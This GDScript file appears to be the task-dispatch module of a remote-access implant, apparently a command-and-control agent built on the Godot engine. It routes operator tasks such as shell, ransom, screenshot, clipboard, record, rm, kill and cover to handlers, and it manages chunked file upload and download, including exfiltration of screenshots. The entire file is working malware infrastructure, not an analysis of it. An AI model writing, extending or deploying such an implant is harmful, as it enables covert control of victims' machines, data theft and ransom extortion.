extends Node

var parent
var api
var task_id_to_last_action

signal whoami
signal exit
signal clipboard
signal ransom
signal cat
signal record
signal cp
signal mv
signal cwd
signal cover
signal post_response
signal ls
signal kill
signal rm
signal shell
signal sleep
signal spawn
signal gdscript
signal upload
signal upload_start
signal upload_chunk
signal download
signal download_start
signal download_chunk
signal screenshot

func _ready():
	parent = $".".get_parent()

	api = parent.get_node("api")
	task_id_to_last_action = {}


func _on_Agent_tasking(data):

	print("on agent tasking: ", data)

	if data.has("payload") and data.get("payload").has("tasks"):

		for task in data.get("payload").get("tasks"):
			print("task: ", task)
			var command = task.get("command")

			match command:
				"screenshot":
					task_id_to_last_action[task.get("id")] = command
				"download":
					task_id_to_last_action[task.get("id")] = command
				"upload":
					task_id_to_last_action[task.get("id")] = command
				_:
					print("unknown task... ", task)

			if has_signal(command):
				emit_signal(command, task)


func _on_Agent_post_response(data):
	print("_on_Agent_post_response: ", data)
	
	var payload = data.get("payload")

	for response in payload.get("responses"):
		var task_id = response.get("task_id")

		if response.get("status") == "success":

			match task_id_to_last_action.get(task_id):
				"upload":
					if response.has("file_id"):
						emit_signal("upload_start", response)
						task_id_to_last_action[task_id ] = "upload_chunk"
					else:
						print("Bad upload response: ", response)
				"upload_chunk":
					if response.has("file_id"):
						emit_signal("upload_chunk", response)
						task_id_to_last_action[task_id ] = "upload_chunk"
					else:
						print("Bad upload response: ", response)
				"download":
					if response.has("file_id"):
						emit_signal("download_start", response)
						task_id_to_last_action[task_id ] = "download_chunk"
					else:
						print("Bad download response: ", response)
				"download_chunk":
					emit_signal("download_chunk", response)
					task_id_to_last_action[task_id ] = "download_chunk"
				"screenshot":
					if response.has("file_id"):
						emit_signal("download_start", response)
						task_id_to_last_action[task_id ] = "download_chunk"
					else:
						print("Bad screenshot response: ", response)
		else:
			print("failed response: ", response)
